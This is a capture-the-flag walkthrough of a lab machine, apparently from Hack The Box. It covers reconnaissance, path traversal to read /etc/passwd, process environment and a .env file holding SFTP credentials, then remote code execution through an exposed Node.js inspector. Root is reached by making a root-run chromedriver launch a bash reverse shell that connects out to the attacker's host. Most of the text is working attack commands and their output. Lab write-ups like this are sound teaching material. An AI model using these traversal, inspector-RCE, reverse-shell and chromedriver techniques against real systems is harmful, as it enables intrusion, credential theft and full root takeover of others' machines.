
Target : 10.129.24.60

Date : 18/06/2026

```bash
>  echo "10.129.24.60 store.htb" | sudo tee -a /etc/hosts  
10.129.24.60 store.htb
>  nmap -sC -sV -O -Pn -p- --min-rate=3000 -T4 10.129.24.60  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-18 02:58 +0200  
Warning: 10.129.24.60 giving up on port because retransmission cap hit (6).  
Nmap scan report for store.htb (10.129.24.60)  
Host is up (0.056s latency).  
Not shown: 65531 closed tcp ports (reset)  
PORT     STATE SERVICE VERSION  
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:    
|   256 30:68:b8:a8:f5:47:ca:bf:1a:23:97:d5:4c:77:97:da (ECDSA)  
|_  256 3f:83:9f:53:0a:49:db:00:d5:18:85:e9:2f:05:76:dd (ED25519)  
5000/tcp open  http    Node.js (Express middleware)  
|_http-title: Secure Encrypted Storage - 01001101 01101001 01101100 01101001...  
5001/tcp open  http    Node.js (Express middleware)  
|_http-title: Secure Encrypted Storage - 01001101 01101001 01101100 01101001...  
5002/tcp open  http    Node.js (Express middleware)  
|_http-title: Secure Encrypted Storage - 01001101 01101001 01101100 01101001...  
Device type: general purpose|router  
Running: Linux 5.X, MikroTik RouterOS 7.X  
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3  
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)  
Network Distance: 2 hops  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 58.68 seconds
```

We have three ports open : one `22 ssh/tcp` and three `Node.js 5000;5001;5002/tcp` running on `Linux`. This must mean the machine is the host of a `web application` of some sort, and might be a server since `Node.js` is what allows the  `web applications` and `browsers` to communicate with the backend machine or server in `javascript`.

```bash
>  curl -sI http://store.htb:5000/  
  
HTTP/1.1 200 OK  
X-Powered-By: Express  
Content-Type: text/html; charset=utf-8  
Content-Length: 1161  
ETag: W/"489-WmtntEqn7sxOXR0efV6R4TvN9ws"  
Date: Wed, 17 Jun 2026 18:59:20 GMT  
Connection: keep-alive  
Keep-Alive: timeout=5

>  curl -sL http://store.htb:5000/  
<!DOCTYPE html><html><head><title>Secure Encrypted Storage - 01001101 01101001 01101100 01101001 01110100 01100001 01110010 01111001 00100000 01000111 01110010 01100001 01100100 01100101</title><link rel="style  
sheet" href="/css/bootstrap.min.css"><link rel="stylesheet" href="/css/styles.css"></head><body><nav class="navbar navbar-expand-lg navbar-dark bg-dark"><a class="navbar-brand d-flex align-items-center" href="#  
"> <span class="mx-auto">Secure Encrypted Storage - 01001101 01101001 01101100 01101001 01110100 01100001 01110010 01111001 00100000 01000111 01110010 01100001 01100100 01100101</span></a></nav><div class="cont  
ainer listing-reg mt-5"><div class="container">     <div class="d-flex h-100 align-items-center justify-content-center"><img src="/images/laptop.jpg" alt=""></div><div class="d-flex h-100 align-items-center jus  
tify-content-center"><h5>We store all your data with military grade encryption!</h5></div><div class="btn-group d-flex justify-content-center my-5"><a class="btn btn-primary" href="/list" role="button">List Fil  
es</a><a class="btn btn-secondary" href="/upload" role="button">Upload File</a></div></div></div></body></html>%
```

We can see that the data is encrypted with `"military grade encryption` and we have some binaries. The first binary `01001101 01101001 01101100 01101001 01110100 01100001 01110010 01111001 00100000 01000111 01110010 01100001 01100100 01100101` translates to `Military Grade`. I won't translate the second one because it looks exactly the same.
It must be to either reassure the users or intimidate the attackers.

The other `Node.js` ports give the exact same response.

We'll try fuzzing subdirectories and directories :


```bash
>  ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://store.htb -H "Host: http://FUZZ.store.htb" -mc 200,301,302  
  
       /'___\  /'___\           / ___\          
      /\ \__/ /\ \__/  __  __  /\ \__/          
      \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\         
       \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/         
        \ \_\   \ \_\  \ \____/  \ \_\          
         \/_/    \/_/   \/___/    \/_/          
  
      v2.1.0-dev  
________________________________________________  
  
:: Method           : GET  
:: URL              : http://store.htb  
:: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt  
:: Header           : Host: http://FUZZ.store.htb  
:: Follow redirects : false  
:: Calibration      : false  
:: Timeout          : 10  
:: Threads          : 40  
:: Matcher          : Response status: 200,301,302  
________________________________________________

>  feroxbuster -u http://store.htb:5000/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt  
                                                                                                                                                                                                                    
___  ___  __   __     __      __         __   ___  
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__  
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___  
by Ben "epi" Risher 🤓                 ver: 2.13.1  
───────────────────────────┬──────────────────────  
🎯  Target Url            │ http://store.htb:5000/  
🚩  In-Scope Url          │ store.htb  
🚀  Threads               │ 50  
📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt  
👌  Status Codes          │ All Status Codes!  
💥  Timeout (secs)        │ 7  
🦡  User-Agent            │ feroxbuster/2.13.1  
🔎  Extract Links         │ true  
🏁  HTTP methods          │ [GET]  
🔃  Recursion Depth       │ 4  
───────────────────────────┴──────────────────────  
🏁  Press [ENTER] to use the Scan Management Menu™  
──────────────────────────────────────────────────  
404      GET       10l       15w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter  
301      GET       10l       16w      173c http://store.htb:5000/tmp => http://store.htb:5000/tmp/  
301      GET       10l       16w      179c http://store.htb:5000/images => http://store.htb:5000/images/  
301      GET       10l       16w      173c http://store.htb:5000/css => http://store.htb:5000/css/  
200      GET        1l       35w      589c http://store.htb:5000/list  
200      GET        0l        0w        0c http://store.htb:5000/css/styles.css  
200      GET        1l       51w      807c http://store.htb:5000/upload  
200      GET      177l     1029w    84188c http://store.htb:5000/images/laptop.jpg  
200      GET        7l     2122w   159515c http://store.htb:5000/css/bootstrap.min.css  
200      GET        1l       87w     1161c http://store.htb:5000/  
[####################] - 2m    106351/106351  0s      found:9       errors:0         
[####################] - 2m     26584/26584   187/s   http://store.htb:5000/    
[####################] - 2m     26584/26584   187/s   http://store.htb:5000/tmp/    
[####################] - 2m     26584/26584   188/s   http://store.htb:5000/images/    
[####################] - 2m     26584/26584   187/s   http://store.htb:5000/css/
```

We got `http://store.htb:5000/tmp/` which could lead to some interesting things, `/css` which might just be the `web application`'s `CSS` so chances are we won't find much here, and `/images`. We also got `http://store.htb:5000/list` and `http://store.htb:5000/upload` that might lead us to an opening.

We'll start by `curl`ing these directories :
`
```bash
>  curl -s http://store.htb:5000/upload | w3m -dump -T text/html  
Secure Encrypted Storage - Upload  
  
Please upload your file, we will store it encrypted!  
  
[                    ]  
[Upload File]

>  curl -s http://store.htb:5000/list | w3m -dump -T text/html  
Secure Encrypted Storage - List  
  
Stored files
```

So it seems we can `upload` files via `/upload` and they'll be listed in the `Stored files` in `/list`.

We'll try with a test `text` file containing `Shadow` :

```bash
>  echo "Shadow" > /tmp/shadow.txt  
  
>  curl -s -F "imageupload=@/tmp/shadow.txt" -F "uploadimage=Upload File" http://store.htb:5000/upload ; echo  
  
  
       <script>  
           setTimeout(function() {  
           window.location.href = '/';  
           }, 1000);  
       </script>  
       File upload successfully.
```

We have successfully uploaded the text file. We'll verify :

```bash
>  curl -s http://store.htb:5000/list | w3m -dump -T text/html  
Secure Encrypted Storage - List  
  
Stored files  
  
shadow.txt
```

It is indeed here.

```bash
>  curl -s http://store.htb:5000/list | xmllint --html --xpath '//a/@href' - 2>/dev/null  
href="#"  
href="/file/shadow.txt"
```

So the `retrieval` point of the file we just uploaded is in `/file`. This is where the `content` of `shadow.txt` lives.

```bash
>  curl -s http://store.htb:5000/file/shadow.txt | w3m -dump -T text/html  
Secure Encrypted Storage - Data  
  
Data  
  
Shadow  
  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
Download
```

It does indeed contain "Shadow" which is the `content` of the file.

Now that we know where the actual `content` of the file is and not just the `display` of it, we can attempt `path traversal` from this point :

```bash
>  curl -s "http://store.htb:5000/file/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd" | head -c 800 ; echo  
<!DOCTYPE html><html><head><title>Secure Encrypted Storage - Data</title><link rel="stylesheet" href="/css/bootstrap.min.css"><link rel="stylesheet" href="/css/styles.css"></head><body><nav class="navbar navbar  
-expand-lg navbar-dark bg-dark"><a class="navbar-brand d-flex align-items-center" href="#"> <span class="mx-auto">Secure Encrypted Storage - Data</span></a></nav><div class="container listing-reg mt-5"><h5>Data  
</h5><pre>:V_/yxWK  
#yJ'M@J5*]*  
          Jo3&quot;VU'_fy,  
                          \  
9yM;    &gt;-   =KU5*]&amp;U&gt;-9Z!_ey*W@J5*]g▒J$!ZVgV  
0*]2;J@mp  
               r@      _x'VNrBL        x0QQ&amp;BW     8$ZVB@m;  
                                                                       r[  
                                                                         OVcy@A&amp;U&gt;-     *WU.-P2/  
r[      @6.VKrBL        x$RU-U$1K*WU                                                                    Tm;  
                                   8/\_!39yK~H_:&quot;]g  
                                                        lFK:BJ▒  
                                                               9l]W$^  
                                                                     ]/C0W@Rm/Cg%
```

It's jumble.

We `nano` the jumble and upload it in `/tmp` before reading it :

```bash
>  curl -s -F "imageupload=@/tmp/store.txt" -F "uploadimage=Upload File" http://store.htb:5000/upload >/dev/null  
  
>  curl -s "http://store.htb:5000/tmp/store.txt" | head -c 120 ; echo  
  
ks](    G3ZEwc▒hMZE,9▒V^g.pEwc▒hMZEwc▒hMZEwc▒hMZ9]zJusMZEq$GeMZXKXl_<VC?vVAb:y0P}T���s
```

Same jumble.

We look for the `encryption` process that lead to the uncanny characters in `/etc/passwd` :

```bash
>  curl -s "http://store.htb:5000/file/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd" -o /tmp/resp.html  
  
>  grep -ao 'base64,[A-Za-z0-9+/=]\{20,\}' /tmp/resp.html | head -c 80 ; echo "  <-- base64?"  
  
base64,OgJWDl8veQMCeFdLFQojeRxKJwJNQEo1Kl0XKgxKEm8zIlZVJwMDAl9meQICLAxcFwo5eRxNO  <-- base64?  
>  wc -c /tmp/resp.html  
  
5593 /tmp/resp.html
```

It comes back as `base64` blob.

We use a `python` script that  does the `path traversal` again,`base64-decodes` to `ciphertext` before `uploading` it and reading the stored bytes in a `binary` file to plaintext :

```
root:x:0:0:root:/root:/bin/bash  
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin  
bin:x:2:2:bin:/bin:/usr/sbin/nologin  
sys:x:3:3:sys:/dev:/usr/sbin/nologin  
sync:x:4:65534:sync:/bin:/bin/sync  
games:x:5:60:games:/usr/games:/usr/sbin/nologin  
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin  
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin  
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin  
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin  
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin  
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin  
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin  
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin  
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin  
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin  
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin  
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin  
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin  
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin  
messagebus:x:102:105::/nonexistent:/usr/sbin/nologin  
systemd-timesync:x:103:106:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin  
syslog:x:104:111::/home/syslog:/usr/sbin/nologin  
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin  
tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false  
uuidd:x:107:113::/run/uuidd:/usr/sbin/nologin  
tcpdump:x:108:114::/nonexistent:/usr/sbin/nologin  
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin  
pollinate:x:110:1::/var/cache/pollinate:/bin/false  
landscape:x:111:116::/var/lib/landscape:/usr/sbin/nologin  
fwupd-refresh:x:112:117:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin  
ec2-instance-connect:x:113:65534::/nonexistent:/usr/sbin/nologin  
_chrony:x:114:121:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin  
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash  
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false  
dev:x:1001:1001:,,,:/home/dev:/bin/bash  
sftpuser:x:1002:1002:,,,:/home/sftpuser:/bin/false  
_laurel:x:998:998::/var/log/laurel:/bin/false
```

And we get `/etc/passwd` in plaintext. `dev` lives in `/home/dev`, `sftpuser` in `/home/sftpuser` and `_laurel` in `/var/log/laurel`.

We'll then use the `script` on `/proc/self/environ` since this is where the `virtual interface /proc` gives us the `process directory` directly running on the machine.

```bash
>  python3 ~/Documents/Lyra/Custom/PythonScripts/store_afr.py /proc/self/environ  
  
USER=devnpm_config_user_agent=npm/8.5.1 node/v12.22.9 linux x64 workspaces/falsenpm_node_execpath=/usr/bin/nodenpm_config_noproxy=HOME=/home/devnpm_package_json=/home/dev/projects/store1/package.jsonnpm_config_  
userconfig=/home/dev/.npmrcnpm_config_local_prefix=/home/dev/projects/store1SYSTEMD_EXEC_PID=891COLOR=0npm_config_metrics_registry=https://registry.npmjs.org/LOGNAME=devJOURNAL_STREAM=8:5653npm_config_prefix=/u  
sr/localnpm_config_cache=/home/dev/.npmnpm_config_node_gyp=/usr/share/nodejs/node-gyp/bin/node-gyp.jsPATH=/home/dev/projects/store1/node_modules/.bin:/home/dev/projects/store1/node_modules/.bin:/home/dev/projec  
ts/node_modules/.bin:/home/dev/node_modules/.bin:/home/node_modules/.bin:/node_modules/.bin:/usr/share/nodejs/@npmcli/run-script/lib/node-gyp-bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/sn  
ap/binINVOCATION_ID=fdff0e8fc5564437bdce693eac1af020NODE=/usr/bin/nodeLANG=C.UTF-8npm_lifecycle_script=nodemon --exec 'node --inspect=127.0.0.1:9229 /home/dev/projects/store1/start.js'SHELL=/bin/bashnpm_lifecyc  
le_event=watchnpm_config_globalconfig=/etc/npmrcnpm_config_init_module=/home/dev/.npm-init.jsnpm_config_globalignorefile=/etc/npmignorenpm_execpath=/usr/share/nodejs/npm/bin/npm-cli.jsPWD=/home/dev/projects/sto  
re1npm_config_global_prefix=/usr/localnpm_command=run-scriptINIT_CWD=/home/dev/projects/store1EDITOR=vi%
```

We have `/home/dev/projects/store1/start.js` and several other paths related to `Node.js` such as `/usr/share/nodejs/node-gyp/bin/node-gyp.js`, `/usr/share/nodejs/npm/bin/npm-cli.js` as well as `--exec 'node --inspect=127.0.0.1:9229 /home/dev/projects/store1/start.js'` which points us to a port that wasn't found on the initial fullport scan and that has something to do with the execution of Node.js.

We'll now use the script to look for the `environment` file that might store configuration settings or secrets/credentials/keys :

```bash
>  python3 store_afr.py /home/dev/projects/store1/.env  
  
SFTP_URL=sftp://sftpuser:WidK52pWBtWQdcVC@localhost  
SECRET=Hm9zeWC38  
STORE_HOME=/home/dev/projects/store1  
PORT=5000
```

And here we got what looks like a credential pair : `sftpuser:WidK52pWBtWQdcVC` and a secret `Hm9zeWC38`. `sftpuser` is running on `localhost` which means it's directly on the machine we're targetting.

We'll connect through `Secure File Transfer Protocol` :

```bash
>  sftp sftpuser@store.htb    
Connected to store.htb.  
sftp> ls  
files     
sftp> cd files  
sftp> ls  
data.bin    shadow.txt  store.txt      
sftp> ls -al  
drwxr-xr-x    2 1002     1002         4096 Jun 17 20:42 .  
drwxr-xr-x    3 root     root         4096 Feb 13  2023 ..  
-rw-rw-rw-    1 1002     1002          116 Jun 17 21:01 data.bin  
-rw-rw-rw-    1 1002     1002            7 Jun 17 20:02 shadow.txt  
-rw-rw-rw-    1 1002     1002          769 Jun 17 20:34 store.txt
```

It works, but we only have access to the files.

We'll connect through `ssh` using the `self-loop port 9229/tcp`, loop it back to `our 9229/tcp` and then curl our own `9229/tcp` :

Terminal 1 :

```bash
>  ssh -N -L 9229:127.0.0.1:9229 sftpuser@store.htb  
  
(sftpuser@store.htb) Password:
```

Opened the secure shell and looped it back when I typed the password.

Terminal 2 :

```bash
>  curl -s http://127.0.0.1:9229/json/list  
  
[ {  
 "description": "node.js instance",  
 "devtoolsFrontendUrl": "devtools://devtools/bundled/js_app.html?experiments=true&v8only=true&ws=127.0.0.1:9229/fd3fd266-536f-4d68-8a67-c0b878249027",  
 "devtoolsFrontendUrlCompat": "devtools://devtools/bundled/inspector.html?experiments=true&v8only=true&ws=127.0.0.1:9229/fd3fd266-536f-4d68-8a67-c0b878249027",  
 "faviconUrl": "https://nodejs.org/static/images/favicons/favicon.ico",  
 "id": "fd3fd266-536f-4d68-8a67-c0b878249027",  
 "title": "/home/dev/projects/store1/start.js",  
 "type": "node",  
 "url": "file:///home/dev/projects/store1/start.js",  
 "webSocketDebuggerUrl": "ws://127.0.0.1:9229/fd3fd266-536f-4d68-8a67-c0b878249027"  
} ]
```

Then, we open `netcat` on a third terminal :

```bash
>  nc -lvnp 1337  
  
Listening on 0.0.0.0 1337
```

Then, we use a `payload` with `python` to get `RCE` :

```bash
>  python3 node_rce.py  
  
[+] Attaching to ws://127.0.0.1:9229/fd3fd266-536f-4d68-8a67-c0b878249027  
[+] Sent payload. Check your listener.  
{"id":1,"result":{"result":{"type":"object","subtype":"regexp","className":"RegExp","description":"/a/","objectId":"{\"injectedScriptId\":1,\"id\":1}"}}}
```

And it works :

```bash
>  nc -lvnp 1337  
  
Listening on 0.0.0.0 1337  
Connection received on 10.129.24.60 43776  
whoami  
dev
ls  
README.md  
app.js  
crypto.js  
node_modules  
package-lock.json  
package.json  
public  
routes  
sftp.js  
start.js  
views
id  
uid=1001(dev) gid=1001(dev) groups=1001(dev)
```

We `cat` the user flag in the home directory :

```bash
cat /home/dev/user.txt  
c5ab7b***************9f75c44aa
```

Then we get a proper shell :

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
dev@store:~/projects/store2$
```

We inspect the shell :

```bash
dev@store:~/projects/store2$ id; hostname; pwd; ls -la /  
id; hostname; pwd; ls -la /  
uid=1001(dev) gid=1001(dev) groups=1001(dev)  
store  
/home/dev/projects/store2  
total 72  
drwxr-xr-x  19 root root  4096 Oct 24  2025 .  
drwxr-xr-x  19 root root  4096 Oct 24  2025 ..  
lrwxrwxrwx   1 root root     7 Feb  8  2023 bin -> usr/bin  
drwxr-xr-x   4 root root  4096 Oct 24  2025 boot  
drwxr-xr-x  15 root root  3320 Jun 17 17:54 dev  
drwxr-xr-x 104 root root  4096 Oct 24  2025 etc  
drwxr-xr-x   5 root root  4096 Feb 13  2023 home  
lrwxrwxrwx   1 root root     7 Feb  8  2023 lib -> usr/lib  
lrwxrwxrwx   1 root root     9 Feb  8  2023 lib32 -> usr/lib32  
lrwxrwxrwx   1 root root     9 Feb  8  2023 lib64 -> usr/lib64  
lrwxrwxrwx   1 root root    10 Feb  8  2023 libx32 -> usr/libx32  
drwx------   2 root root 16384 Feb  8  2023 lost+found  
drwxr-xr-x   2 root root  4096 Feb  8  2023 media  
drwxr-xr-x   2 root root  4096 Feb  8  2023 mnt  
drwxr-xr-x   3 root root  4096 Feb 13  2023 opt  
dr-xr-xr-x 286 root root     0 Jun 17 17:52 proc  
drwx------   8 root root  4096 Jun 17 17:54 root  
drwxr-xr-x  31 root root   960 Jun 17 21:42 run  
lrwxrwxrwx   1 root root     8 Feb  8  2023 sbin -> usr/sbin  
drwxr-xr-x   9 root root  4096 Apr 18  2025 snap  
drwxr-xr-x   2 root root  4096 Feb  8  2023 srv  
dr-xr-xr-x  13 root root     0 Jun 17 17:52 sys  
drwxrwxrwt  12 root root  4096 Jun 17 21:54 tmp  
drwxr-xr-x  14 root root  4096 Feb  8  2023 usr  
drwxr-xr-x  14 root root  4096 Feb 13  2023 var  
dev@store:~/projects/store2$ cat /proc/1/cgroup 2>/dev/null; ls -la /.dockerenv 2>/dev/null  
</cgroup 2>/dev/null; ls -la /.dockerenv 2>/dev/null  
0::/init.scope  
dev@store:~/projects/store2$ ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null  
<$ ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null  
State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess                            
LISTEN 0      4096   127.0.0.53%lo:53        0.0.0.0:*                                      
LISTEN 0      5          127.0.0.1:9515      0.0.0.0:*                                      
LISTEN 0      511        127.0.0.1:9231      0.0.0.0:*    users:(("node",pid=1020,fd=22))  
LISTEN 0      511        127.0.0.1:9230      0.0.0.0:*    users:(("node",pid=1018,fd=22))  
LISTEN 0      128          0.0.0.0:22        0.0.0.0:*                                      
LISTEN 0      5              [::1]:9515         [::]:*                                      
LISTEN 0      511                *:5002            *:*    users:(("node",pid=1020,fd=24))  
LISTEN 0      511                *:5001            *:*    users:(("node",pid=1018,fd=24))  
LISTEN 0      128             [::]:22           [::]:*                                      
dev@store:~/projects/store2$ps aux | grep -i chromedriver  
ps aux | grep -i chromedriver  
root         764  0.0  0.3 33612408 12928 ?      Ssl  17:53   0:02 /root/chromedriver  
dev        16645  0.0  0.0   7008  2432 pts/0    S+   22:18   0:00 grep --color=auto -i chromedriver
```

This is critical : `chromedriver` has `root` privileges.

We're going to exploit this :

We build a `.sh` file that targets our VPN on `1338/tcp` on the `dev` shell :

```
dev@store:~/projects/store2$ printf '#!/bin/bash\nbash -i >& /dev/tcp/10.10.14.228/1338 0>&1\n' > /tmp/rev.sh  
<>& /dev/tcp/10.10.14.228/1338 0>&1\n' > /tmp/rev.sh  
dev@store:~/projects/store2$ chmod +x /tmp/rev.sh  
chmod +x /tmp/rev.sh  
dev@store:~/projects/store2$ cat /tmp/rev.sh  
cat /tmp/rev.sh  
#!/bin/bash  
bash -i >& /dev/tcp/10.10.14.228/1338 0>&1  
dev@store:~/projects/store2$
```

Then we open a listener on that port and tell the `ChromeDriver` to execute the `.sh` file on the dev shell to get a root shell :

```bash
>  nc -lvnp 1338  
  
Listening on 0.0.0.0 1338 
```

```bash
dev@store:~/projects/store2$ curl -s -X POST http://127.0.0.1:9515/session -H 'Content-Type: application/json' --data-raw '{"capabilities":{"alwaysMatch":{"goog:chromeOptions":{"binary":"/tmp/rev.sh"}}}}'  
<:{"goog:chromeOptions":{"binary":"/tmp/rev.sh"}}}}'
```


And we get the root flag :

```bash
>  nc -lvnp 1338  
  
Listening on 0.0.0.0 1338  
Connection received on 10.129.24.60 40668  
bash: cannot set terminal process group (764): Inappropriate ioctl for device  
bash: no job control in this shell
root@store:/# cat root/root.txt  
cat root/root.txt  
1bd3e6859*************2a13216
```
